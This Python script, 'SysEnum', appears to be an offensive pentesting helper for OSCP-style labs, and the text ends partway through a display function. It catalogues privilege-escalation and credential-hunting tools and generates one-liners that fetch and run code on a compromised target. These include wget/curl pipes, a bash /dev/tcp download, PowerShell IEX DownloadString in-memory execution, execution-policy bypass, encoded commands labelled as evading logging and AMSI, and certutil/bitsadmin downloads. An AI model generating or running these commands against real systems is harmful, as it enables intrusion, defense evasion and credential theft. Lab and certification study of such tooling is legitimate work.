#!/usr/bin/env python3
# SysEnum by @Mahdiesta | xl337x
# No banner. No noise. Just results.

import os
import sys
import json
import random
import shutil
import socket
import signal
import base64
import threading
import subprocess
import urllib.request
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ─────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────

CACHE_DIR     = Path.home() / ".sysenum"
CACHE_LINUX   = CACHE_DIR / "cache" / "linux"
CACHE_WINDOWS = CACHE_DIR / "cache" / "windows"
CACHE_CUSTOM  = CACHE_DIR / "custom"
CONF_FILE     = CACHE_DIR / "sysenum.conf"

EXCLUDED_PORTS = {
    21, 22, 23, 25, 53, 80, 443, 445, 1433, 1521,
    3306, 3389, 4444, 4445, 5555, 8000, 8080, 8443,
    8888, 9090, 9200, 10000
}

PORT_RANGE = (10001, 65000)

R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
B   = "\033[1;34m"
C   = "\033[1;36m"
W   = "\033[1;37m"
DIM = "\033[2m"
RST = "\033[0m"
LINE = f"{DIM}{'─' * 62}{RST}"

# ─────────────────────────────────────────────────────────────
# TOOL DEFINITIONS
# ─────────────────────────────────────────────────────────────

LINUX_TOOLS = {
    "linpeas.sh": {
        "search_paths": [
            "/opt/PEASS-ng/linPEAS/linpeas.sh",
            "/opt/peass/linpeas.sh",
            "~/tools/linpeas.sh",
            "/usr/share/peass/linpeas.sh",
        ],
        "github": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
        "type": "sh",
        "exec":        "bash {path}",
        "exec_save":   "bash {path} | tee {writable}/lp_out.txt",
        "exec_all":    "bash {path} -a | tee {writable}/lp_out.txt",
        "exec_stealth":"bash {path} -s",
        "guide": [
            "Read RED/YELLOW lines ONLY — ignore everything grey",
            "Priority order: sudo -l → SUID → Interesting Files → Crons",
            "CVE suggestions: verify kernel version EXACTLY before trying",
            "Time-box: 10 min max on output — decide and move on",
            "Stealth flag -s skips time-consuming checks (faster, no disk writes)",
        ],
    },
    "lse.sh": {
        "search_paths": [
            "/opt/lse/lse.sh",
            "~/tools/lse.sh",
            "/opt/linux-smart-enumeration/lse.sh",
        ],
        "github": "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
        "type": "sh",
        "exec":      "bash {path} -l 0",
        "exec_save": "bash {path} -l 1 | tee {writable}/lse_out.txt",
        "guide": [
            "OSCP+ recommended alternative to linpeas — scored output, less noise",
            "Level 0 = quick wins only (fastest, use first)",
            "Level 1 = interesting findings (good balance)",
            "Level 2 = full dump equivalent to linpeas",
            "Findings are scored 0-100 — focus on 90+ first",
        ],
    },
    "pspy64": {
        "search_paths": [
            "/opt/pspy/pspy64",
            "~/tools/pspy64",
            "/usr/local/bin/pspy64",
        ],
        "github": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
        "type": "elf",
        "exec":        "chmod +x {path} && {path}",
        "exec_verbose":"chmod +x {path} && {path} -pf -i 1000",
        "exec_save":   "chmod +x {path} && {path} | tee {writable}/pspy_out.txt",
        "guide": [
            "Monitors running processes WITHOUT root — unique capability",
            "Wait 60-120 seconds minimum before concluding nothing runs",
            "Watch UID=0 lines → root executing something",
            "Look for relative binary paths in commands → PATH hijack vector",
            "Credentials passed as CLI arguments will appear in process list",
            "Use -pf -i 1000 to also monitor filesystem events",
            "Use pspy32 on 32-bit systems — pspy64 will segfault",
        ],
    },
    "pspy32": {
        "search_paths": [
            "/opt/pspy/pspy32",
            "~/tools/pspy32",
        ],
        "github": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
        "type": "elf",
        "exec": "chmod +x {path} && {path}",
        "guide": [
            "Use on 32-bit systems only — same usage as pspy64",
            "Check arch with: uname -m  (i686 = 32-bit, x86_64 = 64-bit)",
        ],
    },
    "LinEnum.sh": {
        "search_paths": [
            "/opt/LinEnum/LinEnum.sh",
            "~/tools/LinEnum.sh",
        ],
        "github": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
        "type": "sh",
        "exec":          "bash {path}",
        "exec_thorough": "bash {path} -t",
        "exec_save":     "bash {path} -r {writable}/linenum -e {writable}/",
        "guide": [
            "Cleaner more readable output than linpeas",
            "Use -t for thorough (slower but more complete)",
            "Use -r for saving report to file: -r /tmp/report -e /tmp/",
            "Good secondary confirmation after linpeas/lse",
        ],
    },
    "les.sh": {
        "search_paths": [
            "/opt/linux-exploit-suggester/linux-exploit-suggester.sh",
            "~/tools/les.sh",
            "/opt/les/les.sh",
        ],
        "github": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
        "type": "sh",
        "exec":      "bash {path}",
        "exec_save": "bash {path} | tee {writable}/les_out.txt",
        "guide": [
            "Matches running kernel version to known kernel CVEs",
            "Verify kernel version manually: uname -r",
            "Only trust 'Highly Probable' rated results",
            "Kernel exploits = LAST RESORT on OSCP (can crash box)",
            "Cross-check with WES-NG from Kali for confidence",
        ],
    },
    "linuxprivchecker.py": {
        "search_paths": [
            "/opt/linuxprivchecker/linuxprivchecker.py",
            "~/tools/linuxprivchecker.py",
        ],
        "github": "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py",
        "type": "py",
        "py_bin":    "python",
        "exec":      "python {path}",
        "exec_save": "python {path} | tee {writable}/lpc_out.txt",
        "guide": [
            "Python 2 script — must be run with 'python' not 'python3'",
            "Use when bash scripts fail or restricted shell",
            "If only python3 exists: try linpeas.sh or lse.sh instead",
        ],
    },
    "suid3num.py": {
        "search_paths": [
            "/opt/SUID3NUM/suid3num.py",
            "~/tools/suid3num.py",
        ],
        "github": "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py",
        "type": "py",
        "exec": "python3 {path}",
        "guide": [
            "Auto-checks ALL SUID binaries on system against GTFOBins",
            "Saves manually searching every SUID binary on the site",
            "Shows exact GTFOBins exploit command per matched binary",
            "Run after: find / -perm -4000 -type f 2>/dev/null",
        ],
    },
}

WINDOWS_TOOLS = {
    "winPEASany.exe": {
        "search_paths": [
            "/opt/PEASS-ng/winPEAS/winPEASexe/winPEAS/bin/Obfuscated Releases/winPEASany.exe",
            "/opt/peass/winPEASany.exe",
            "~/tools/winPEASany.exe",
        ],
        "github": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe",
        "type": "exe",
        "guide": [
            "Runs on any .NET version — most compatible winPEAS variant",
            "Read RED/YELLOW lines only — same as linpeas",
            "Priority: Services → AlwaysInstallElevated → Credentials → Registry",
            "Save output: winPEASany.exe > C:\\Windows\\Temp\\wp_out.txt",
            "Run and do other enum while it finishes — it's slow",
        ],
    },
    "winPEAS.bat": {
        "search_paths": [
            "/opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat",
            "~/tools/winPEAS.bat",
        ],
        "github": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
        "type": "bat",
        "guide": [
            "No .NET required — pure batch script fallback",
            "Use when exe fails: AV block, no .NET, restricted execution",
            "Less thorough than exe but always runs on old Windows",
            "Run from cmd.exe — not PowerShell",
        ],
    },
    "PowerUp.ps1": {
        "search_paths": [
            "/opt/PowerSploit/Privesc/PowerUp.ps1",
            "~/tools/PowerUp.ps1",
            "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1",
        ],
        "github": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1",
        "type": "ps1",
        "invoke": "Invoke-AllChecks",
        "guide": [
            "Best for: service misconfigs, unquoted paths, weak DACLs",
            "On disk: Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
            "In memory: IEX (New-Object Net.WebClient).DownloadString('URL'); Invoke-AllChecks",
            "AbuseFunction field = exact exploit command — copy and run it",
            "Use on older Windows; use PrivescCheck.ps1 on modern Windows",
        ],
    },
    "PrivescCheck.ps1": {
        "search_paths": [
            "/opt/PrivescCheck/PrivescCheck.ps1",
            "~/tools/PrivescCheck.ps1",
        ],
        "github": "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1",
        "type": "ps1",
        "invoke": "Invoke-PrivescCheck",
        "guide": [
            "Better than PowerUp on Win10/11/Server2019+ — fewer false positives",
            "On disk: . .\\PrivescCheck.ps1; Invoke-PrivescCheck",
            "Extended + report: Invoke-PrivescCheck -Extended -Report pe -Format TXT",
            "Use as PRIMARY tool on modern Windows, PowerUp as secondary",
        ],
    },
    "Seatbelt.exe": {
        "search_paths": [
            "/opt/GhostPack/Seatbelt/bin/Release/Seatbelt.exe",
            "~/tools/Seatbelt.exe",
        ],
        "github": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe",
        "type": "exe",
        "guide": [
            "Best tool for credential hunting on Windows",
            "Quick cred sweep: Seatbelt.exe CredEnum",
            "Full offensive sweep: Seatbelt.exe -group=all",
            "Specific: Seatbelt.exe KeePass PuttyHostKeys RDCManFiles ChromiumPresence",
            "Requires .NET 4.0+",
        ],
    },
    "SharpUp.exe": {
        "search_paths": [
            "/opt/GhostPack/SharpUp/bin/Release/SharpUp.exe",
            "~/tools/SharpUp.exe",
        ],
        "github": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe",
        "type": "exe",
        "guide": [
            "Compiled C# equivalent of PowerUp — runs when PS is blocked",
            "Run: SharpUp.exe audit",
            "Finds same vectors as PowerUp: services, scheduled tasks, registry",
            "Use when PowerShell execution is fully locked down",
        ],
    },
    "Snaffler.exe": {
        "search_paths": [
            "/opt/Snaffler/Snaffler.exe",
            "~/tools/Snaffler.exe",
        ],
        "github": "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe",
        "type": "exe",
        "guide": [
            "Best tool for AD environments — hunts credentials across all shares",
            "Run: Snaffler.exe -s -o C:\\Windows\\Temp\\snaffler.log",
            "Finds: config files, private keys, KeePass DBs, password spreadsheets",
            "Monitor log while running: type C:\\Windows\\Temp\\snaffler.log",
            "Takes time on large networks — let it run in background",
        ],
    },
    "Watson.exe": {
        "search_paths": [
            "/opt/Watson/bin/Release/Watson.exe",
            "~/tools/Watson.exe",
        ],
        "github": "https://github.com/rasta-mouse/Watson",
        "type": "exe",
        "guide": [
            "Detects missing patches → suggests kernel/unpatched exploits",
            "Run: Watson.exe",
            "USE AS LAST RESORT — unpatched exploits can crash/blue-screen the box",
            "Requires .NET 4.0+",
            "Cross-check results with WES-NG on Kali for confidence",
        ],
    },
}

# ─────────────────────────────────────────────────────────────
# CACHE LAYER
# ─────────────────────────────────────────────────────────────

def init_cache():
    CACHE_LINUX.mkdir(parents=True, exist_ok=True)
    CACHE_WINDOWS.mkdir(parents=True, exist_ok=True)
    CACHE_CUSTOM.mkdir(parents=True, exist_ok=True)
    if not CONF_FILE.exists():
        CONF_FILE.write_text(json.dumps({"linux": {}, "windows": {}, "custom": {}}, indent=2))

def load_manifest():
    try:
        return json.loads(CONF_FILE.read_text())
    except Exception:
        return {"linux": {}, "windows": {}, "custom": {}}

def save_manifest(m):
    CONF_FILE.write_text(json.dumps(m, indent=2))

def expand_paths(paths):
    return [Path(os.path.expandvars(os.path.expanduser(p))) for p in paths]

def find_tool_on_system(info):
    for p in expand_paths(info.get("search_paths", [])):
        if p.exists():
            return p
    return None

def cache_tool_file(name, src, os_type):
    dest_dir = CACHE_LINUX if os_type == "linux" else CACHE_WINDOWS
    dest = dest_dir / name
    shutil.copy2(src, dest)
    os.chmod(dest, 0o755)
    return dest

def sync_cache(manifest):
    changed = False
    for name, info in {**LINUX_TOOLS}.items():
        if name not in manifest["linux"]:
            found = find_tool_on_system(info)
            if found:
                dest = cache_tool_file(name, found, "linux")
                manifest["linux"][name] = {
                    "cached": True,
                    "cached_at": datetime.now().strftime("%Y-%m-%d"),
                    "source": str(found),
                    "size": f"{dest.stat().st_size // 1024}KB",
                }
                changed = True
    for name, info in {**WINDOWS_TOOLS}.items():
        if name not in manifest["windows"]:
            found = find_tool_on_system(info)
            if found:
                dest = cache_tool_file(name, found, "windows")
                manifest["windows"][name] = {
                    "cached": True,
                    "cached_at": datetime.now().strftime("%Y-%m-%d"),
                    "source": str(found),
                    "size": f"{dest.stat().st_size // 1024}KB",
                }
                changed = True
    if changed:
        save_manifest(manifest)
    return manifest

def get_cached_tools(os_type, manifest):
    cache_dir = CACHE_LINUX if os_type == "linux" else CACHE_WINDOWS
    result = {}
    for name in (LINUX_TOOLS if os_type == "linux" else WINDOWS_TOOLS):
        p = cache_dir / name
        if p.exists():
            result[name] = p
    for name, info in manifest.get("custom", {}).items():
        if info.get("os_type") == os_type:
            p = CACHE_CUSTOM / name
            if p.exists():
                result[name] = p
    return result

def get_missing_tools(os_type, cached):
    defs = LINUX_TOOLS if os_type == "linux" else WINDOWS_TOOLS
    return [n for n in defs if n not in cached]

def download_missing_tools(missing, os_type, manifest):
    """Offer to auto-download every missing tool from its GitHub URL."""
    if not missing:
        return manifest

    defs      = LINUX_TOOLS if os_type == "linux" else WINDOWS_TOOLS
    cache_dir = CACHE_LINUX if os_type == "linux" else CACHE_WINDOWS
    os_key    = os_type

    print_section(f"Auto-Download Missing Tools ({len(missing)} missing)")
    for name in missing:
        url = defs.get(name, {}).get("github", "")
        if url:
            print(f"  {R}[✗]{RST} {name:<32} {DIM}{url}{RST}")
        else:
            print(f"  {R}[✗]{RST} {name:<32} {DIM}no URL defined{RST}")

    print()
    ch = input(f"  {Y}[?]{RST} Download ALL missing tools now? (Y/n): ").strip().lower()
    if ch == "n":
        return manifest

    for name in missing:
        url = defs.get(name, {}).get("github", "")
        if not url:
            print(f"  {Y}[!]{RST} {name:<32} no URL — skipping")
            continue

        dest = cache_dir / name
        print(f"  {Y}[*]{RST} Downloading {W}{name}{RST} ...", end="", flush=True)
        try:
            # Show a spinner-ish progress via reporthook
            def _hook(count, block, total):
                if total > 0:
                    pct = min(int(count * block * 100 / total), 100)
                    print(f"\r  {Y}[*]{RST} Downloading {W}{name}{RST} ... {pct}%   ", end="", flush=True)

            urllib.request.urlretrieve(url, dest, reporthook=_hook)
            os.chmod(dest, 0o755)
            size = dest.stat().st_size // 1024
            print(f"\r  {G}[✓]{RST} {name:<32} {size}KB")
            manifest.setdefault(os_key, {})[name] = {
                "cached":     True,
                "cached_at":  datetime.now().strftime("%Y-%m-%d"),
                "source":     url,
                "size":       f"{size}KB",
            }
        except Exception as e:
            print(f"\r  {R}[✗]{RST} {name:<32} FAILED: {e}")
            # Clean up partial file
            if dest.exists():
                dest.unlink()

    save_manifest(manifest)
    return manifest

# ─────────────────────────────────────────────────────────────
# CACHE MANAGEMENT MENU
# ─────────────────────────────────────────────────────────────

def show_cache_status(manifest):
    print_section("Cache Status — Linux")
    for name, info in LINUX_TOOLS.items():
        p = CACHE_LINUX / name
        if p.exists():
            size = f"{p.stat().st_size // 1024}KB"
            at = manifest["linux"].get(name, {}).get("cached_at", "?")
            print(f"  {G}[✓]{RST} {name:<32} {size:<10} {DIM}{at}{RST}")
        else:
            print(f"  {R}[✗]{RST} {name:<32} {DIM}MISSING{RST}")
            print(f"       {DIM}→ {info.get('github','')}{RST}")
    print_section("Cache Status — Windows")
    for name, info in WINDOWS_TOOLS.items():
        p = CACHE_WINDOWS / name
        if p.exists():
            size = f"{p.stat().st_size // 1024}KB"
            at = manifest["windows"].get(name, {}).get("cached_at", "?")
            print(f"  {G}[✓]{RST} {name:<32} {size:<10} {DIM}{at}{RST}")
        else:
            print(f"  {R}[✗]{RST} {name:<32} {DIM}MISSING{RST}")
            print(f"       {DIM}→ {info.get('github','')}{RST}")
    if manifest.get("custom"):
        print_section("Cache Status — Custom")
        for name, info in manifest["custom"].items():
            p = CACHE_CUSTOM / name
            tag = G + "[✓]" + RST if p.exists() else R + "[✗]" + RST
            print(f"  {tag} {name:<32} {DIM}({info.get('os_type','?')}){RST}")

def add_local_tool(manifest):
    path = input(f"  {Y}[?]{RST} Local file path: ").strip()
    p = Path(os.path.expanduser(path))
    if not p.exists():
        print(f"  {R}[!]{RST} File not found.")
        return
    os_type = input(f"  {Y}[?]{RST} OS type (linux/windows): ").strip().lower()
    dest = CACHE_CUSTOM / p.name
    shutil.copy2(p, dest)
    os.chmod(dest, 0o755)
    manifest.setdefault("custom", {})[p.name] = {
        "cached": True, "os_type": os_type,
        "cached_at": datetime.now().strftime("%Y-%m-%d"),
        "source": str(p),
    }
    save_manifest(manifest)
    print(f"  {G}[+]{RST} Cached: {p.name}")

def add_download_tool(manifest):
    url     = input(f"  {Y}[?]{RST} Download URL: ").strip()
    name    = input(f"  {Y}[?]{RST} Save as filename: ").strip()
    os_type = input(f"  {Y}[?]{RST} OS type (linux/windows): ").strip().lower()
    dest    = CACHE_CUSTOM / name
    print(f"  {Y}[*]{RST} Downloading {name}...")
    try:
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, 0o755)
        manifest.setdefault("custom", {})[name] = {
            "cached": True, "os_type": os_type,
            "cached_at": datetime.now().strftime("%Y-%m-%d"),
            "source": url,
        }
        save_manifest(manifest)
        size = dest.stat().st_size // 1024
        print(f"  {G}[+]{RST} Cached: {name} ({size}KB)")
    except Exception as e:
        print(f"  {R}[!]{RST} Download failed: {e}")

def remove_tool_from_cache(manifest):
    name = input(f"  {Y}[?]{RST} Tool name to remove: ").strip()
    removed = False
    for d in [CACHE_LINUX, CACHE_WINDOWS, CACHE_CUSTOM]:
        p = d / name
        if p.exists():
            p.unlink()
            removed = True
    for key in ["linux", "windows", "custom"]:
        if name in manifest.get(key, {}):
            del manifest[key][name]
    if removed:
        save_manifest(manifest)
        print(f"  {G}[+]{RST} Removed: {name}")
    else:
        print(f"  {R}[!]{RST} Not found in cache.")

def cache_management_menu(manifest):
    while True:
        lc = sum(1 for n in LINUX_TOOLS   if (CACHE_LINUX   / n).exists())
        wc = sum(1 for n in WINDOWS_TOOLS if (CACHE_WINDOWS / n).exists())
        cc = len(list(CACHE_CUSTOM.iterdir()))
        total = sum(f.stat().st_size for f in CACHE_DIR.rglob("*") if f.is_file())
        print_section("Cache Management")
        print(f"  Linux:   {G}{lc}/{len(LINUX_TOOLS)}{RST} cached")
        print(f"  Windows: {G}{wc}/{len(WINDOWS_TOOLS)}{RST} cached")
        print(f"  Custom:  {G}{cc}{RST} tools")
        print(f"  Size:    {Y}{total // 1024 // 1024}MB{RST}")
        print(f"\n  {W}[1]{RST} Show full status")
        print(f"  {W}[2]{RST} Add tool — local file")
        print(f"  {W}[3]{RST} Add tool — download URL")
        print(f"  {W}[4]{RST} Re-scan system for tools")
        print(f"  {W}[5]{RST} Remove a tool")
        print(f"  {W}[6]{RST} Clear entire cache")
        print(f"  {W}[b]{RST} Back")
        ch = input(f"\n  {Y}>{RST} ").strip().lower()
        if ch == "b":
            break
        elif ch == "1":
            show_cache_status(manifest)
        elif ch == "2":
            add_local_tool(manifest)
        elif ch == "3":
            add_download_tool(manifest)
        elif ch == "4":
            print(f"  {Y}[*]{RST} Scanning system...")
            manifest = sync_cache(manifest)
            print(f"  {G}[+]{RST} Done.")
        elif ch == "5":
            remove_tool_from_cache(manifest)
        elif ch == "6":
            confirm = input(f"  {R}[!]{RST} Clear ALL cached tools? Type 'yes' to confirm: ").strip()
            if confirm == "yes":
                shutil.rmtree(CACHE_DIR)
                init_cache()
                manifest = load_manifest()
                print(f"  {G}[+]{RST} Cache cleared.")
    return manifest

# ─────────────────────────────────────────────────────────────
# NETWORK / INTERFACE
# ─────────────────────────────────────────────────────────────

def get_interfaces():
    ifaces = {}
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr", "show"], stderr=subprocess.DEVNULL, text=True
        )
        current = None
        for line in out.splitlines():
            stripped = line.strip()
            parts = stripped.split()
            if not parts:
                continue
            # Interface line
            if not stripped.startswith("inet") and ":" in parts[0]:
                name = parts[0].rstrip(":")
                if name != "lo":
                    current = name
            elif stripped.startswith("inet ") and current:
                ip = parts[1].split("/")[0]
                ifaces[current] = ip
    except Exception:
        pass
    if not ifaces:
        try:
            ip = socket.gethostbyname(socket.gethostname())
            ifaces["eth0"] = ip
        except Exception:
            ifaces["eth0"] = "127.0.0.1"
    return ifaces

def select_interface():
    ifaces = get_interfaces()
    items = list(ifaces.items())
    suggested = 0
    for i, (name, _) in enumerate(items):
        if "tun" in name:
            suggested = i
            break
    print_section("Interface Selection")
    for i, (name, ip) in enumerate(items, 1):
        tag = ""
        if "tun" in name:
            tag = f"  {G}← OSCP VPN (recommended){RST}"
        elif "vpn" in name.lower():
            tag = f"  {Y}← VPN{RST}"
        print(f"  {W}[{i}]{RST} {name:<14} {C}{ip}{RST}{tag}")
    default = suggested + 1
    ch = input(f"\n  {Y}[?]{RST} Select interface [{default}]: ").strip() or str(default)
    try:
        idx = int(ch) - 1
        name, ip = items[idx]
        print(f"  {G}[+]{RST} Interface: {W}{name}{RST} → {C}{ip}{RST}")
        return name, ip
    except (ValueError, IndexError):
        print(f"  {R}[!]{RST} Invalid. Using default.")
        name, ip = items[suggested]
        return name, ip

# ─────────────────────────────────────────────────────────────
# PORT
# ─────────────────────────────────────────────────────────────

def pick_port():
    while True:
        port = random.randint(*PORT_RANGE)
        if port in EXCLUDED_PORTS:
            continue
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.3)
            if s.connect_ex(("127.0.0.1", port)) != 0:
                return port

# ─────────────────────────────────────────────────────────────
# PATH SELECTION
# ─────────────────────────────────────────────────────────────

LINUX_PATHS = [
    ("/tmp",            "almost always writable, most common"),
    ("/dev/shm",        "memory-backed, no disk artifact"),
    ("/var/tmp",        "persists reboots, often overlooked"),
    ("/run/user/$UID",  "modern systems, per-user tmpfs"),
]

WINDOWS_PATHS = [
    ("C:\\Windows\\Temp",          "writable by all users"),
    ("C:\\Users\\Public",          "writable by all users"),
    ("C:\\Temp",                   "often exists, writable"),
    ("%APPDATA%\\Local\\Temp",     "current user only"),
    ("C:\\ProgramData",            "writable, often overlooked"),
]

def select_writable_path(os_type):
    defaults = LINUX_PATHS if os_type == "linux" else WINDOWS_PATHS
    print_section("Target Writable Path")
    for i, (path, note) in enumerate(defaults, 1):
        print(f"  {W}[{i}]{RST} {path:<35} {DIM}{note}{RST}")
    print(f"  {W}[c]{RST} Custom path")
    ch = input(f"\n  {Y}[?]{RST} Select path [1]: ").strip() or "1"
    if ch.lower() == "c":
        path = input(f"  {Y}[?]{RST} Enter custom path: ").strip()
    else:
        try:
            path = defaults[int(ch) - 1][0]
        except (ValueError, IndexError):
            path = defaults[0][0]
    print(f"  {G}[+]{RST} Write path: {C}{path}{RST}")
    return path

def writability_test(os_type, writable):
    if os_type == "linux":
        return (
            f"echo writable_test > {writable}/.se_test "
            f"&& echo '[+] WRITABLE' "
            f"&& rm {writable}/.se_test "
            f"|| echo '[-] NOT WRITABLE — choose another path'"
        )
    else:
        return (
            f"echo test > {writable}\\se_test.txt "
            f"&& echo [+] WRITABLE "
            f"&& del {writable}\\se_test.txt "
            f"|| echo [-] NOT WRITABLE — choose another path"
        )

# ─────────────────────────────────────────────────────────────
# ONE-LINER GENERATORS
# ─────────────────────────────────────────────────────────────

def gen_linux_oneliners(name, url, writable, info):
    dest   = f"{writable}/{name}"
    t      = info.get("type", "sh")
    py_bin = info.get("py_bin", "python3")   # py2 tools set py_bin="python"
    if t == "elf":
        run = f"chmod +x {dest} && {dest}"
    elif t == "py":
        run = f"{py_bin} {dest}"
    else:
        run = f"chmod +x {dest} && bash {dest}"

    save = info.get("exec_save", "").format(path=dest, writable=writable)
    lines = {}
    lines["wget"]  = f"wget -q '{url}' -O {dest} && {run}"
    lines["curl"]  = f"curl -s '{url}' -o {dest} && {run}"
    lines["py3"]   = (
        f"python3 -c \""
        f"import urllib.request; "
        f"urllib.request.urlretrieve('{url}','{dest}')\" && {run}"
    )
    lines["py2"]   = (
        f"python -c \""
        f"import urllib; "
        f"urllib.urlretrieve('{url}','{dest}')\" && {run}"
    )
    lines["perl"]  = (
        f"perl -e 'use LWP::Simple; "
        f"getstore(\"{url}\",\"{dest}\");' && {run}"
    )
    lines["bash_tcp"] = (
        f"exec 3<>/dev/tcp/$(echo '{url}' | cut -d/ -f3 | cut -d: -f1)"
        f"/$(echo '{url}' | cut -d: -f3 | cut -d/ -f1); "
        f"echo -e 'GET /{name} HTTP/1.0\\r\\n\\r\\n' >&3; "
        f"tail -c +1 <&3 > {dest}; {run}"
    )
    if save:
        lines["wget+save"] = f"wget -q '{url}' -O {dest} && {save}"
    return lines

def b64ps(cmd):
    """Encode PowerShell command to base64 for -EncodedCommand."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode()

def gen_windows_oneliners(name, url, writable, info):
    dest = f"{writable}\\{name}"
    t    = info.get("type", "exe")
    inv  = info.get("invoke", "")

    # Determine run commands
    if t == "ps1":
        run_disk   = f". '{dest}'; {inv}" if inv else f"Import-Module '{dest}'"
        run_mem    = f"IEX (New-Object Net.WebClient).DownloadString('{url}')" + (f"; {inv}" if inv else "")
        run_mem_iwr = f"IEX (iwr '{url}' -UseBasicParsing)" + (f"; {inv}" if inv else "")
    elif t == "bat":
        run_disk = dest
        run_mem  = None
        run_mem_iwr = None
    else:
        run_disk = dest
        run_mem  = None
        run_mem_iwr = None

    groups = {}

    # ── GROUP A: evil-winrm (Ruby / evil-winrm-python) ──────
    ewrm_lines = [
        f"# ─ Method 1: evil-winrm built-in upload (run from Kali shell) ─",
        f"upload /path/to/{name} '{dest}'",
        f"",
        f"# ─ Then execute on target ─",
        f"{run_disk}",
        f"",
        f"# ─ Method 2: If upload fails (evil-winrm-python / restricted) ─",
        f"(New-Object Net.WebClient).DownloadFile('{url}','{dest}'); {run_disk}",
    ]
    if t == "ps1" and run_mem:
        ewrm_lines += [
            f"",
            f"# ─ Method 3: In-memory (no disk touch) ─",
            f"{run_mem}",
        ]
    groups["A_evil_winrm"] = {
        "label": "GROUP A — evil-winrm / evil-winrm-python",
        "lines": ewrm_lines,
    }

    # ── GROUP B: PowerShell 5+ (IWR available) ──────────────
    ps5_lines = [
        f"# ─ Download + execute ─",
        f"iwr '{url}' -OutFile '{dest}'; {run_disk}",
    ]
    if t == "ps1" and run_mem_iwr:
        ps5_lines += [
            f"",
            f"# ─ In-memory (no disk) ─",
            f"{run_mem_iwr}",
        ]
    groups["B_ps5plus"] = {
        "label": "GROUP B — PowerShell 5+ (Invoke-WebRequest available)",
        "lines": ps5_lines,
    }

    # ── GROUP C: PowerShell 2/3 (No IWR) ────────────────────
    ps2_lines = [
        f"# ─ Download + execute ─",
        f"(New-Object Net.WebClient).DownloadFile('{url}','{dest}'); {run_disk}",
    ]
    if t == "ps1" and run_mem:
        ps2_lines += [
            f"",
            f"# ─ In-memory (no disk) ─",
            f"{run_mem}",
        ]
    groups["C_ps2"] = {
        "label": "GROUP C — PowerShell 2/3 (Net.WebClient, no IWR)",
        "lines": ps2_lines,
    }

    # ── GROUP D: Restricted PS (ExecutionPolicy blocked) ────
    inner_dl  = f"(New-Object Net.WebClient).DownloadFile('{url}','{dest}')"
    bypass_disk = f"powershell -ep bypass -c \"{inner_dl}; {run_disk}\""
    d_lines = [
        f"# ─ Bypass execution policy — disk ─",
        bypass_disk,
    ]
    if t == "ps1":
        bypass_mem = f"powershell -ep bypass -c \"{run_mem}\""
        enc_cmd    = run_mem if run_mem else f"(New-Object Net.WebClient).DownloadString('{url}') | IEX"
        enc        = b64ps(enc_cmd)
        d_lines   += [
            f"",
            f"# ─ In-memory bypass ─",
            bypass_mem,
            f"",
            f"# ─ Encoded command (evades script-block logging) ─",
            f"powershell -nop -noni -ep bypass -enc {enc}",
            f"",
            f"# ─ From cmd.exe when PS is partially locked ─",
            f"cmd /c powershell -ep bypass -c \"{run_mem}\"",
        ]
    groups["D_restricted_ps"] = {
        "label": "GROUP D — Restricted PowerShell (ExecutionPolicy bypass)",
        "lines": d_lines,
    }

    # ── GROUP E: cmd.exe only (no PowerShell) ───────────────
    groups["E_cmd_only"] = {
        "label": "GROUP E — cmd.exe only (no PowerShell available)",
        "lines": [
            f"# ─ certutil (most reliable) ─",
            f"certutil -urlcache -split -f {url} {dest} && {dest}",
            f"",
            f"# ─ bitsadmin (fallback) ─",
            f"bitsadmin /transfer sysenum /download /priority normal {url} {dest} && {dest}",
        ],
    }

    # ── GROUP F: In-memory only (AV evasion, no disk) ───────
    if t == "ps1" and run_mem:
        enc_mem = b64ps(run_mem)
        groups["F_memory_only"] = {
            "label": "GROUP F — In-memory only (AV evasion / no disk touch)",
            "lines": [
                f"# ─ Standard memory execution ─",
                f"{run_mem}",
                f"",
                f"# ─ With execution policy bypass ─",
                f"powershell -ep bypass -c \"{run_mem}\"",
                f"",
                f"# ─ Fully encoded (bypass + AMSI evasion attempt) ─",
                f"powershell -nop -noni -ep bypass -enc {enc_mem}",
            ],
        }

    return groups

# ─────────────────────────────────────────────────────────────
# DISPLAY HELPERS
# ─────────────────────────────────────────────────────────────

def print_section(title):
    print(f"\n{LINE}")
    print(f"  {C}{title}{RST}")
    print(LINE)

def print_linux_block(name, oneliners):
    print(f"\n  {Y}┌─ {name} ─────────────────────────────────────{RST}")
    labels = {
        "wget":      "wget     ",
        "curl":      "curl     ",
        "py3":       "python3  ",
        "py2":       "python2  ",
        "perl":      "perl     ",
        "bash_tcp":  "bash/tcp ",
        "wget+save": "wget+log ",
    }
    for key, cmd in oneliners.items():
        label = labels.get(key, key)
        print(f"\n  {DIM}  [{label}]{RST}")
        print(f"  {W}  {cmd}{RST}")

def print_windows_block(name, groups):
    print(f"\n  {Y}┌─ {name} ─────────────────────────────────────{RST}")
    for gkey, gdata in groups.items():
